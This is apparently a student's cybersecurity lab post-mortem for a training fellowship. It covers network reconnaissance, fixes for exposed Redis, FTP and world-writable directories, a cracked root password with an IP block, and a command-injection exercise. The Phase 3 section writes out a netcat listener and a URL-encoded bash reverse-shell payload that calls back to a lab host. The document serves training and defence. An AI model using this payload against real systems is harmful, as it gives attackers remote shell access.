# Phase 1 Final Reckoning — TEPP Post-Mortem
**Operator:** Sok Leng Chan
**Date:** May 28, 2026
**Repository:** https://github.com/slcha25/Cyberlab-Portfolio/tree/main
**TKH Innovation Fellowship 2026 | Phase 1 | Cybersecurity**

---

## Phase 0: Reconnaissance

### Triage Network — 172.100.0.0/24
[3–5 sentences in APA style. What hosts did you find? What ports and
services were exposed? What misconfigurations did you identify?]
Four hosts were identified in the 172.100.0.0/24 network. Services discovered included Redis (6379/tcp), FTP (21/tcp), and Elasticsearch (9200/tcp).
One host had no open ports. The exposed services may represent potential security risks and attack surfaces.

### Breach Network — 172.80.0.0/24
[3–5 sentences in APA style. What hosts did you find? What ports and
services were exposed? What did you observe that informed your Phase 2
approach?]
One active host was discovered in the 172.80.0.0/24 network. The host exposed SSH (22/tcp) and Elasticsearch (9200/tcp).
Elasticsearch disclosed version and cluster information that may assist future reconnaissance and exploitation activities.

### Exploitation Network — 172.60.0.0/24
[3–5 sentences in APA style. What hosts did you find? What ports and
services were exposed? What vulnerability did you identify before
executing your exploit?]
Two active hosts were identified in the 172.60.0.0/24 network. Services included SSH (22/tcp), Elasticsearch (9200/tcp),
and a Python-based web server on port 80. The exposed web application may present opportunities for vulnerability assessment and exploitation.

---

## Phase 1: Rapid Triage

### Server 1 — 172.100.0.11
**Vulnerability Identified:**
Redis database service was exposed to the network on port 6379 without any firewall restrictions. 
This was confirmed by scanning the host with `nmap -p 6379 172.100.0.11` and observing the port was open.

**Remediation Commands:**
sudo docker exec -it broken_server_1 /bin/sh
iptables -A INPUT -p tcp --dport 6379 -j DROP
iptables -L -v -n
exit

**Before State:**
Port 6379 was open and accessible from any IP address. No firewall rules were blocking access to the Redis service.

**After State:**
iptables rule added to DROP all incoming TCP traffic on port 6379. Redis is no longer accessible from outside the container.

**Analysis:**
Exposing a database directly to the network without authentication or firewall protection creates a critical security
vulnerability. An attacker who discovers the open port could connect to Redis, enumerate keys, and exfiltrate or modify
 sensitive data. In a real enterprise environment, databases should be bound to localhost or placed behind a properly
 configured firewall with strict access controls (Bhardwaj & Bhardwaj, 2024).

### Server 2 — 172.100.0.12
**Vulnerability Identified:**
Unauthorized FTP service (vsftpd) was running on the server.

**Remediation Commands:**
sudo docker exec -it broken_server_2 /bin/bash
ps aux | grep vsftpd
kill -9 21
kill -9 1

**Before State:**
FTP service was active (PID 21) with a controlling bash process (PID 1).

**After State:**
Container stopped; no FTP processes running on the host.

**Analysis:**
Unauthorized services represent a significant security risk as they create unmonitored attack surfaces.
An attacker could exploit misconfigured FTP credentials or anonymous access to upload malicious files or
exfiltrate sensitive data. In a production environment, any unauthorized service should be immediately
investigated and removed through formal change management processes.

### Server 3 — 172.100.0.13
**Vulnerability Identified:**
The `/var/www/html` directory had world-writable permissions (777).

**Remediation Commands:**
sudo docker exec -it broken_server_3 /bin/sh
ls -la /var/www/
chmod 755 /var/www/html

**Before State:**
/var/www/html was set to 777 (drwxrwxrwx)

**After State:**
/var/www/html was set to 755 (drwxr-xr-x)

**Analysis:**
World-writable directories on a web server create a critical security risk. Any authenticated user could modify web content,
upload malicious scripts, or deface the website. In a real enterprise environment, web directories should follow 
the principle of least privilege typically 755 for directories and 644 for files, owned by the web application user 
rather than root.

---

## Phase 2: The Breach

**Cracked Credentials:**
- Username: root
- Password: admin123

**Forensic Evidence:**
- Exact Timestamp of Successful Login: May 31 00:18:59
- Attacker IP Address: 172.80.1.1

**Engineered iptables Rule:**
iptables -A INPUT -s 172.80.1.1 -j DROP

**SOC Analysis:**
A single iptables block rule is insufficient as a standalone defensive measure because attackers can easily change their source IP
 address using botnets or proxy services. A real SOC would deploy additional controls such as intrusion detection systems (IDS) to
 alert on suspicious behavior, fail2ban to dynamically block repeated failed attempts, and centralized logging with a SIEM to
 correlate attack patterns across multiple hosts (Vacca, 2023). Defense in depth requires layered security rather than reliance on
 a single perimeter control.
---

## Phase 3: Full Spectrum

**Listener Configuration:**
nc -lvnp 4444


**Reverse Shell Payload:**
curl "http://172.60.0.10/exec?cmd=;%20bash%20-i%20%3E%26%20/dev/tcp/172.60.0.1/4444%200%3E%261"

**Command Injection Explanation:**
Command injection occurs when an application passes unsanitized user input to a system shell. In this vulnerable web
 application, the /exec endpoint directly concatenates the cmd parameter into a shell command, allowing an attacker to
 execute arbitrary system commands with the privileges of the web server (Jang-Jaccard & Nepal, 2014).

**Forensic Evidence:**
- Process ID (PID): 1
- User-Agent: unkown

**Lockdown Command:**
iptables -A INPUT -s 172.60.0.1 -j DROP

**Final Analytical Paragraph:**
Executing this attack demonstrates that a single command injection vulnerability can lead to complete system compromise.
 Defending against such attacks requires input validation, output encoding, and the principle of least privilege.
 The single defensive control that would have stopped this breach entirely is proper input sanitization specifically,
 avoiding the use of system() calls with user-supplied input and using parameterized APIs or whitelisting allowed commands.
 If the web application had validated that the cmd parameter only contains expected values (e.g., "ping" or "traceroute"),
 the malicious payload would have been rejected before execution. In a real enterprise environment, additional layers such
 as a Web Application Firewall (WAF) and regular security testing would further reduce the risk of command injection
 vulnerabilities (OWASP, 2021).

---

## References
[APA format. Any tools, documentation, or resources referenced
during this operation.
Example: Hydra Project. (2024). THC-Hydra: A fast and flexible
online password cracking tool. https://github.com/vanhauser-thc/thc-hydra]
